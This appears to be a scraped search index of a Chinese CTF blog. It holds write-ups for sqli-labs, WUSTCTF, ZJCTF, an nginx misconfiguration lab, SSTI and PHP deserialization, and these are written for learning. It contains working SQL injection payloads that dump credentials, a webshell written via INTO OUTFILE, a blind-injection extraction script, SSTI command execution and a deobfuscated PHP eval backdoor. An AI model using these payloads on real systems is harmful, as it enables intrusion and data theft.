需要修改php.ini中的phar.readonly，且一定要去掉前面的分号！…… 上传文件名：$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”; move_uploaded_file($_FILES[“file”][“tmp_name”],”upload/“ . $filename); 转移到指定的upload目录 生成phar后改后缀为jpg，上传 用phar协议去读取： phar://upload/febdf38ac03e62cb8f05d46cefefd732.jpg 得到flag……","link":"/2021/05/04/SWPUCTF-2018-SimplePHP/"},{"title":"Sqli-labs","text":"Less-1先用or 1=1，只显示一条结果，应该有limit语句…… 1?id=1' order by 3--+ 判断列数以便使用联合查询，发现有三列。 1?id=' union select 1,database(),3--+ 正常回显，当前库是security。 查表： 1?id=' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+ 查字段： 1?id=' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+ 可以查询用户名与密码： 1?id=' union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+ Less-1结束…… Less-2?id=1 and 1=2 无回显，数值型注入…… order by 3 即有三列。 用的好像还是security库…… 1?id=0 union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+ em，和Less-1差不多…… Less-3?id=1’回显有点奇怪…… 那一部分应该是：**’1”) LIMIT 0,1**，应该是id=(‘$id’) ?id=1’)–+ 回显正常 ?id=1’) order by 3–+ 有3列 1?id=') union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+ OK Less-4?id=1’’’’’’’’’’’’’’’’’’–+123156hbhj–+ 没有任何的报错……应该是都被认为是字符了 ?id=1” 报错： 这里大概是：id=(“$id”) ?id=1”)–+ 回显正常 1?id=&quot;) union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+ 这样就可以了…… Less-5 emm……不太懂，查一波。 这波大概是盲注，盲注也有很多种…… ?id=1’ and left(database(),1)=’s’–+ //一位一位判断库名 ?id=1’ and if(length(database())=8,sleep(1),1)–+ //利用时间延迟判断猜测是否正确3 结合burpsuit可以更方便一些…… 还有更强的方法：双查询联合注入 详细讲解双查询注入csdn 双查询注入（大佬） sql注入之双查询注入（简书） 这些文章都尽可能的解释了这个方法…… group by 的说明 理解一波，不知道对不对…… group by 读取时，查找字段名中是否有key，没有则插入。但是每次读取判断时，floor(random(0)*2)是随机的0或1……所以概率出现重复插入的情况，此时会发生报错，报错内容回显出database()的内容。 eg：*?id=’ union select count(*),count(*),concat(‘‘,(select database()),’‘,floor(rand()*2)) as a from information_schema.tables group by a–+* 那这个count(*)又有什么作用…… 本以为是像select 1，2，3一样占行数的……但改成1和2又会不起效果…… 必须有一个count(*)才行…… 这个看着差不多，结合自己理解一波： 先以语句结果去寻找，找不到，插入语句重新计算得到的结果。这样的话，表至少有两列，这个方法才能成功（至少遍历两次才能产生冲突）。若第二次找不到，则插入新结果，此时还要计算对应的count，遍历数据。 SQL有三个类型的索引，唯一索引 不能有重复，但聚集索引，非聚集索引可以有重复 主键key默认是唯一索引。count的再次遍历发现了主键索引的冲突，报错。大概是这样？…… 还有，再查当前库时，可以用：**?id=-1’ union select n from n–+** 直接得到security……不过好像只能干这个…… 1?id=' union select 1,count(\\*),concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 查当前库 1?id=-1' union select count(\\*),1, **concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit x,1)**,'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 修改x可以查各个表名 ?id=-1’ union select count(*),1, concat(‘~‘,(select column_name from information_schema.columns where table_name=’users’ limit x,1),’~’,floor(rand()*2)) as a from information_schema.tables group by a–+ 修改x可以查各个列名 1?id=-1' union select count(*),1, concat('~',(select concat_ws('[',password,username) from users limit x,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 修改x可以查各个字段 百分百成功(大概)：rand()里面的seed调为小于等于0，对于指定的seed，rand的值相同。但是是什么，为什么我都不知道……我也是试出来的，也查不清楚…… 回来再试试~~ Less-6?id=1” 报错 ?id=1”–+成功 1?id=-1&quot; union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit x,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 查表 差不多…… Less-7 outfile又不懂辽…… ?id=1’–+ 只提示有错误……没有错误的回显了。查资料辽。 ?id=1‘)) and (select count(*) from mysql.user)&gt;0 –+ 判断有没有文件写入权限，不过只显示有错误，不知道是不是语法错误…… ?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,1) –+ 进入，应该是没有写入/写出权限 关于file权限： 12341 必须有权限读取并且文件必须完全可读 2 目的文件必须在服务器上 3 必须指定文件完整的路径 4 欲读取文件必须小于 max_allowed_packet 由于phpstudy的设置，所以在网站上操作没有权限，好像是secure_file_priv需要设置一下…… 更改之后：?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,0) –+ 成功进入 导出文件：?id=1’)) union select 1,database(),user() into outfile “D:\\pp.txt”–+ 报错但文件成功导出。 *?id=’)) union select * from users into outfile “D:\\apap.txt”–+* OK。 导入文件： ?id=1’)) union select 1,2,’&lt;?php @eval($_POST[“b”])?&gt;‘ into outfile “D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.php”–+ 反斜杠“\\”是Windows系统文件目录结构使用的分隔符，如：D:\\我的文档。只有 windows 支持反斜杠路径符 \\ ，而unix支持 / 但是我们还应该知道 \\ 也是转义字符，在url中他会当成转义字符处理，所以我们用 \\ 对反斜杠进行转义，那么结果就变成了一个反斜杠 成功连接。 Less-8这次彻底没有任何错误回显了…… 只能一位一位注…同Less-5的第一种方法： ?id=1’ and left(database(),1)=’s’–+ //一位一位判断库名 ?id=1’ and if(length(database())=8,sleep(1),1)–+ //利用时间延迟判断猜测是否正确 结合burpsuit可以更方便一些……不用bp也可以用二分法。 ?id=1’ and if(left((select table_name from information_schema.tables where table_schema=database() limit x,1),1)=’r’ , sleep(1), 1) –+ //查表 ?id=1’ and if(left((select column_name from information_schema.columns where table_name=’users’ limit x,1),1)=’a’, sleep(1), 1) –+ //查列 ?id=1’ and if(left((select password from users limit 0,1),4)=’dumb’ , sleep(1), 1) –+ //查数据 Less-9 em，和Less-8是一样的。 Less-10不论怎么打，都是“You are in”…… 源代码： $id的值左右拼接了“ ”；这样处理的话只能用and去判断 所以用双引号就行了……其他和Less-8是一样的。 1-10:OK","link":"/2021/01/25/Sqli-labs/"},{"title":"Systemlearning-1","text":"","link":"/2021/01/23/Systemlearning-1/"},{"title":"WUSTCTF2020-朴实无华","text":"[WUSTCTF2020]朴实无华这个题的各种编码还是挺烦人的…… robots.php里有：/fAke_f1agggg.php，结果确实fake…… 抓包发现： 访问： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; }else{ die(&quot;金钱解决不了穷人的本质问题&quot;); }}else{ die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{ die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;快到非洲了&quot;); }}else{ die(&quot;去非洲吧&quot;);}?&gt; bypass 第一点的intval的绕过好像也和版本有关，新版本似乎是支持科学计数法的（有一次疯狂思考绕过…… 这里传入2e4即可绕过 level2：$md5==md5($md5)弱比较，其实也就是0e开头的md5值md5后仍是0e开头+数字的字符串 写了一个垃圾脚本： 1234567891011121314151617181920from hashlib import md5import refor a in '1234567890': for b in '1234567890': for c in '1234567890': for d in '1234567890': for e in '1234567890': for f in '1234567890': for g in '1234567890': for h in '1234567890': for i in '1234567890': j=f&quot;0e{a}{b}{c}{d}{e}{f}{g}{h}{i}&quot; p=md5(j.encode('utf8')).hexdigest() if p[0:2]=='0e': pp = p[2:32] if re.match(&quot;\\d{30,30}&quot;,pp): print(j) print(p) break 超级暴力循环…… 最后找到三对： 0e2159620170e2912424769407768451503085778240e7300833520e8706358753042771702599502559280e8070971100e318093639164485566453180786895 level3： 干掉了空格和cat，但读取的方法有很多，空格也有绕过方法： 这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串 这里大于号或小于号也是可以绕过的…… 读取就很容易了 getflag！ ……","link":"/2021/04/12/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"},{"title":"WUSTCTF2020-颜值成绩查询","text":"[WUSTCTF2020]颜值成绩查询进入题目是一个查询，联想到之前做的题： 这里就是一个数值型的注入，奇怪的是，啥都没过滤，直接盲注： ?stunum=if(ord(substr(database(),0,1))&gt;=0,1,0)%23 ?stunum=if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0,1))&gt;=0,1,0)%23 表： flag在value列中： 脚本： 12345678910111213141516171819202122import requestsimport timeflag = &quot;&quot;for x in range(1,100): l = 32 r = 126 while r &gt; l: mid = int((l + r + 1) / 2) x = str(x) y = str(mid) url = 'http://ae264edd-9cc0-4005-8193-2fe2294f2118.node3.buuoj.cn/?stunum=if(ord(substr((select(value)from(flag)),'+x+',1))&gt;='+y+',1,0)#' response = requests.get(url=url) if &quot;admin&quot; in response.text: l = mid else: r = mid - 1 time.sleep(0.03) flag += (chr(int(r))) print(chr(int(r))) print(flag)print(flag) （最近没怎么做sql注入的题，手有点生……","link":"/2021/04/16/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/"},{"title":"ZJCTF-2019-NiZhuanSiWei","text":"[ZJCTF 2019]NiZhuanSiWei1.题目：12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;Not now!&quot;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; 2.过程：先是考察伪协议： file_get_contents可以用data伪协议写入数据：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= //使text值为”welcome to the zjctf” file提示useless.php，用php://filter读取： php://filter/read=convert.base64-encode/resource=useless.php 关于__tostring： 打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。如果没有这个方法，那么echo一个对象时，就会报错Object of class Account could not be converted to string，实际上这是一个类型匹配失败的错误。 echo $password 就是使其调用反序列化后的__tostring方法。 那再读取flag.php就行了。结果半天没有反应…… 仔细读源码发现一丝异常：脚本并没有调用useless.php……一般会requireonce或include include($file)是可控的，使file为useless.php： 1password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;} 解码得： 1234567891011&lt;br&gt;oh u find it &lt;/br&gt;&lt;!--but i cant give it to u now--&gt;&lt;?phpif(2===3){ return (&quot;flag{6d50eb08-b4b8-410c-a0b0-afa2c0e6c828}&quot;);}?&gt;","link":"/2021/02/12/ZJCTF-2019-NiZhuanSiWei/"},{"title":"XML入门","text":"XML入门可扩展标记语言，标准通用标记语言的子集，简称XML。是一种用于标记电子文件使其具有结构性的标记语言。 1.引入一段标准的xml数据格式： 与HTML 不同，xml注重于数据的储存与传输而不是展示。","link":"/2021/03/14/XML/"},{"title":"b01lers2020-Welcome-to-Earth","text":"摘要js 解密 1. 根界面123456789101112131415161718192021222324252627&lt;h1&gt;AMBUSH!&lt;/h1&gt;&lt;p&gt;You've gotta escape!&lt;/p&gt;&lt;script&gt; document.onkeydown = function(event) { event = event || window.event; if (event.keyCode == 27) { event.preventDefault(); window.location = &quot;/chase/&quot;; } else die(); }; function sleep(ms) { return new Promise(resolve =&gt; setTimeout(resolve, ms)); } async function dietimer() { await sleep(10000); die(); } function die() { window.location = &quot;/die/&quot;; } dietimer(); &lt;/script&gt; 在1s内逃跑 2. /chase/12345678910111213141516171819202122232425262728293031323334&lt;h1&gt;CHASE!&lt;/h1&gt; &lt;p&gt; You managed to chase one of the enemy fighters, but there's a wall coming up fast! &lt;/p&gt; &lt;script&gt; function sleep(ms) { return new Promise(resolve =&gt; setTimeout(resolve, ms)); } async function dietimer() { await sleep(1000); die(); } function die() { window.location = &quot;/die/&quot;; } function left() { window.location = &quot;/die/&quot;; } function leftt() { window.location = &quot;/leftt/&quot;; } function right() { window.location = &quot;/die/&quot;; } dietimer(); &lt;/script&gt; 事件触发 leftt…… 3. /leftt/12345&lt;h1&gt;SHOOT IT&lt;/h1&gt; &lt;p&gt;You've got the bogey in your sights, take the shot!&lt;/p&gt; &lt;button onClick=&quot;window.location='/die/'&quot;&gt;Take the shot&lt;/button&gt; &lt;!-- &lt;button onClick=&quot;window.location='/shoot/'&quot;&gt;Take the shot&lt;/button&gt; --&gt; …… 4. /shoot/123&lt;h1&gt;YOU SHOT IT DOWN!&lt;/h1&gt; &lt;p&gt;Well done! You also crash in the process&lt;/p&gt;&lt;button onClick=&quot;window.location='/door/'&quot;&gt;Continue&lt;/button&gt; 5. /door/很多按钮…… 1&lt;button onClick=&quot;check_door()&quot;&gt;Check&lt;/button&gt; 点击触发事件，看引入的js文件 door.js 1234567891011function check_door() { var all_radio = document.getElementById(&quot;door_form&quot;).elements; var guess = null; for (var i = 0; i &lt; all_radio.length; i++) if (all_radio[i].checked) guess = all_radio[i].value; rand = Math.floor(Math.random() * 360); if (rand == guess) window.location = &quot;/open/&quot;; else window.location = &quot;/die/&quot;;} 6. /open/12&lt;h1&gt;YOU FOUND THE DOOR!&lt;/h1&gt; &lt;p&gt;How do you open it?&lt;/p&gt; 直接看引入的js 12345678910function sleep(ms) { return new Promise(resolve =&gt; setTimeout(resolve, ms));}function open(i) { sleep(1).then(() =&gt; { open(i + 1); }); if (i == 4000000000) window.location = &quot;/fight/&quot;;} 7. /fight/又是点击触发，js： 123456789101112131415161718// Run to scramble original flag//console.log(scramble(flag, action));function scramble(flag, key) { for (var i = 0; i &lt; key.length; i++) { let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; } return flag;}function check_action() { var action = document.getElementById(&quot;action&quot;).value; var flag = [&quot;{hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!}&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]; // TODO: unscramble function} “混淆”了flag，直接手解：pctf{hey_boys_im_baaaaaaaaaack!} 大佬的 python 脚本解法 12345678910#coding:utf-8from itertools import permutationsflag = [&quot;{hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!}&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item: k = ''.join(list(i)) if k.startswith('pctf{hey_boys') and k[-1] == '}': print(k) 用的全排列，🐂 参考文章:qaq","link":"/2021/08/16/b01lers2020-Welcome-to-Earth/"},{"title":"Web_php_wrong_nginx_config","text":"Web_php_wrong_nginx_config进入题目是一个登录界面，拿御剑扫一下： 出来很多，但只有admin管用…… admin有一个please continue……手动发现robots.txt……愣是扫不出来 ：hints.php Hack.php hints告诉我们 应该有一个文件读取的部分…… 抓包，cookie里有一个isLogin=0，改成1进入了网站页面： 管理中心页面： 这里应该可以读取配置文件……读不出来，原来是过滤了../ 双写： ?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext= 读取： 按照提示说的，应该是Nginx的配置文件，用nginx-config-formatter-master整理代码： python nginxfmt.py [filename.conf] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253server { listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\\d{4})-(\\d{2})-(\\d{2})&quot;) { set $year $1; set $month $2; set $day $3;}# Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off;set $http_x_forwarded_for_filt $http_x_forwarded_for;if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) { set $http_x_forwarded_for_filt $1???;}# Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;error_log /var/log/nginx/error.log info;location / { # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args; server_tokens off;}#error_page 404 /404.html;# redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html;location = /50x.html { root /usr/share/nginx/html;}location ~ \\.php$ { try_files $uri $uri/ /index.php?q=$uri&amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for;}location ~ /\\. { log_not_found off; deny all;}location /web-img { alias /images/; autoindex on;}location ~* \\.(ini|docx|pcapng|doc)$ { deny all;}include /var/www/nginx[.]conf;} location这里就是处理路由，location明确不同的节点该如何处理： deny all 即拒绝访问。也可以allow指定IP访问 root： location /i/ { root /data/w3; } root的处理结果是：root路径＋location路径 请求 http://xxxx/i/top.gif 这个地址时，那么在服务器里面对应的真正的资源是 /data/w3/i/top.gif文件 alias： location /i/ { alias /data/w3/; } alias的处理结果是：使用alias路径替换location路径 同样请求 http://foofish.net/i/top.gif 时，在服务器查找的资源路径是： /data/w3/top.gif，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。 尽管绝大部分配置都看不懂，但知道有一个/web-img的路径，转到根目录的/images中去…… 而alias下的是： autoindex on; Nginx默认是不允许列出整个目录的 如需此功能，打开nginx.conf文件，在location server 或 http段中加入autoindex on； 也就是访问这个网页可以实现网站目录遍历 访问：http://111.200.241.244:58533/web-img/ 该目录下没有什么文件，访问/web-img../相当于/images/../，可以读到上层的目录 发现hack.php.bak下载读取： php混淆……离谱 观察一下，关键是利用$f创建了一个函数，输出f并格式化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php$kh=&quot;42f7&quot;;$kf=&quot;e9ac&quot;;function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for ($i=0;$i&lt;$l;) { for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) { $o.=$t { $i } ^$k { $j } ; } } return $o;}$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra) { $u=parse_url($rr); parse_str($u[&quot;query&quot;],$q); $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m); if($q&amp;&amp;$m) { @session_start(); $s=&amp;$_SESSION; $ss=&quot;substr&quot;; $sl=&quot;strtolower&quot;; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=&quot;&quot;; for ($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) { $s[$i]=&quot;&quot;; $p=$ss($p,3); } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e) { $k=$kh.$kf; ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;); @session_destroy(); } } }} 离谱，php混淆的代码，后面有个eval，大概是一个马…… 我太菜了，看不动…… dalao：https://blog.csdn.net/weixin_44604541/article/details/107801811 dalao竟然写了可交互的脚本……离谱： tql ……wohaocai","link":"/2021/03/18/Web-php-wrong-nginx-config/"},{"title":"buu两道SSTI","text":"buu两道SSTI1.题目：2.过程：Web_python_template_injection进入题目，只有一个页面……随便访问一个： 得到配置 这里简单的lipsum方法似乎不行……在不确定的情况下，可以用模板支持的python语句进行遍历： 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.func_globals['linecache'].__dict__['os'].popen('ls').read()}}{% endif %}{% endfor %} 找到指定的模块并运用即可： 获得flag shrine进入题目发现给了python的源码： 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 设置了一个flask对象：app flag大概是被设置到对象的配置文件中 路由中有：/shrine/&lt;path:shrine&gt; 访问并查看源码： SSTI……blaklist 相当于：+s 还会替换 ‘(‘ 和 ‘)’ …… 这里要注意，config是flask中的变量，记录了整个配置信息。set config=None仅仅是使得此方法无法使用，而不是替换’config‘为’None‘，所以 会返回None。我们仍有其他方法访问config。 1{{self.__dict__}}也可以得到config，只是同样被禁用了…… Flask特有的变量和函数 config | request | session | url_for() | get_flashed_messages() 详细方法：https://blog.csdn.net/enjolras_fuu/article/details/82229073 123在url_for.__globals__中，我们可以找到有关app配置的模块current_app可以通过{{url_for.__globals__['current_app'].config}}来读取当前对象的配置get_flashed_messages中好像也有…… 或许这种情况应该在这些函数中翻一翻相关的文件……就能找到方法 获得flag 两道题是不同的考点，都是基础…… 学习了……","link":"/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/"},{"title":"easy_serialize_php","text":"easy_serialize_php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);}if($_SESSION){ unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function){ echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png');}else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file'){ highlight_file('index.php');}else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here!}else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));} 题目是一道关于session的反序列化 先看一下利用点： 1234else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));} 大概是利用file_get_contents去读取flag文件，题目告诉我们phpinfo里有提示 （然而buu现在直接卡掉含有phpinfo的域名…… https://blog.csdn.net/weixin_30547797/article/details/96985303 可以找到敏感文件： 然后就是session的序列化： extract($_POST);应该是通过post方式覆写变量，而反序列化读取的是$userinfo[‘img’]，也就是session[image]中的内容： 12345if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png');}else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));} 如果sha1,则不能再base64解码……若走第一条，内容则是指定的。 1$serialize_info = filter(serialize($_SESSION)); filter对序列化进行了过滤删除，构造使删除后序列化仍合法，有机会实现覆写： 反序列化的对象逃逸值逃逸控制序列化后的某个值为过滤字，过滤后根据规则，后面的字符会被解析进前面的键作为键值 再在后面闭合使其符合序列化语法： 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} 这样提交后，flagflagflagflagflagflag被消除掉，取而代之的是&quot;;s:8:&quot;function&quot;;s:1:&quot;a，这样字符串就是合法的，后面img的值也就被覆盖了 键逃逸 1_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} 吃掉的正是对后面值的描述，这样控制好键的字数，就可以精确做到逃逸……大概…… 这道题中决定逃逸的是，extract出现在img之前，user、function之后，不能通过直接覆写改变img，只能通过其他键（或构造特殊键），构造其中的键值来实现合法的反序列化字符串覆写，读取我们想要的文件。 ……","link":"/2021/04/01/easy-serialize-php/"},{"title":"hacker101.0","text":"hacker101.0https://www.bilibili.com/video/av75418689/ 1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分） Bure Proxy &amp; Firefox Bure Proxy可以对HTTP和HTTPS的流量包进行监控和修改，是业内流行工具。 Firefox在做请求处理时，可以通过它轻松实现浏览器的代理设置，而无需对系统做其他的设置。设置后，它捕获的即是我们所关心的web应用流量而非系统的其他流量。Firefox还包括了一些开发调试的工具，可以方便的查看修改cookie信息，检查DOM……这就是为什么作者推荐Firefox。当然，也可以用Chrome和Burp一起配合工作。 2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分） 我们应当站在attacker的角度来思考问题，而不是defender。应该了解攻击者对攻击目标的攻击套路和攻击思维。对一些测试的应用程序来说，了解他的最好方法是大胆点击它的每个功能按钮来加深对他的功能认识并发现它的功能弱点。 作者还强调，攻防双方在安全职责任务上存在一种不平衡。通常对于防护者来说，必须去发现系统中所有存在的漏洞；对于攻击者，只需发现少量或一个漏洞即可。攻击者比防护者明显更具优势。实战可能方法很简单，但是不可能发现的了所有漏洞。精力是有限的，我们必须有轻重缓急之分，尤其要学会识别一些高风险漏洞问题，最大化降低攻击影响或一些可能的情况。换位思考评估攻击者最想获得什么东西，这是重要的安全技能培养方法。 对每个功能点进行熟悉并为之可能产生的漏洞分类与评级，考虑不同功能点的综合利用，这有助于理清逻辑并尽可能先发现更加危险的漏洞。 3.审计以下代码： 12345678&lt;?phpif(isset($_GET[ ' name ' ])){echo &quot;&lt;h1&gt;Hello {$_GET['name']} !&lt;/h1&gt;&quot;;}?&gt;&lt;form method=&quot;GET&quot;&gt;Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;input type=&quot; submit&quot;&gt; 本段代码涉及到客户端，服务端以及通信协议。运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释 通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET 运行在服务端的代码为php，由php核心负责解释。 用户端与服务端通过HTTP通信协议进行交互。 那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分） 客户端是通过传递什么参数来控制服务端代码的？（1分） 客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分） ​ https://blog.csdn.net/wang404838334/article/details/78449149 服务器web：我们把提供（响应）服务的计算机称作服务器（Server），也叫服务器端。 客户端web：接受（请求）服务的计算机称作客户机（Client），也叫客户端。 ①当用户在浏览器地址中输入要访问的PHP页面文件名，然后回车就会触发这个PHP请求，并将请求传送化支持PHP的WEB服务器。 ②WEB服务器接受这个请求，并根据其后缀进行判断如果是一个PHP请求，WEB服务器从硬盘或内存中取出用户要访问的PHP应用程序，并将其发送给PHP引擎程序。 ③PHP引擎程序将会对WEB服务器传送过来的文件从头到尾进行扫描并根据命令从后台读取，处理数据，并动态地生成相应的HTML页面。 ④PHP引擎将生成HTML页面返回给WEB服务器（apache）。WEB服务器再将HTML页面返回给客户端浏览器，最后一个完整的页面基于通过浏览器展现在我们眼前。 这里内嵌的php语句应当是服务端的内容，而html的渲染是属于客户端浏览器上渲染的。 客户端在html显示的表单通过get提交了一个name参数，服务端识别这个以get方法提交的参数，在echo &quot;&lt;h1&gt;Hello {$_GET['name']} 